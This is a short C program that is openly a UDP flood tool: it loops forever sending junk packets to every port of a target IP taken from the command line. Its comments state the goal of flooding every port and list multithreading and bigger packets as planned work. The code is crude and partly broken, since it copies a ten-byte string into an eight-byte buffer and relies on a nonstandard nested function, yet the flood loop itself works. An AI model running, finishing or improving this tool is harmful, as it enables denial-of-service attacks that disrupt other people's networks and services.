#include <stdio.h>
#include <stdint.h>
#include <netdb.h>
#include <string.h> // strcpy
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> // close
#include <stdlib.h>
/** GOAL
 * send big udp packet data to every single port(YES) with multithreads capability
*/

/** TODO
 * multi threads
 * adjust packet size
*/

int8_t main(int argc, char **argv)
{
    int s;
    uint16_t port;
    struct sockaddr_in server;
    unsigned char *buff = malloc(sizeof(uint64_t));
    strcpy(buff, "ambatukam");
    uint8_t buff_len = strlen(buff);

    int8_t send_attack(char *ip)
    {
        if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            // tcperror("socket()");
            return 1;
        }

        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(ip);

        for (uint16_t x = 1; x < 65535; x++) { // from 1 to 65535
            printf("Sending attack %s %d byte: %s:%d\n", buff, buff_len, ip, x);
            port = htons(x);
            server.sin_port = port;

            if (sendto(s, buff, (strlen(buff) + 1), 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
                // tcperror("sendto()");
                return 1;
            }
        }

    }

    while(1)
    {
        send_attack(argv[1]);
    }
    close(s);
    return 0;
}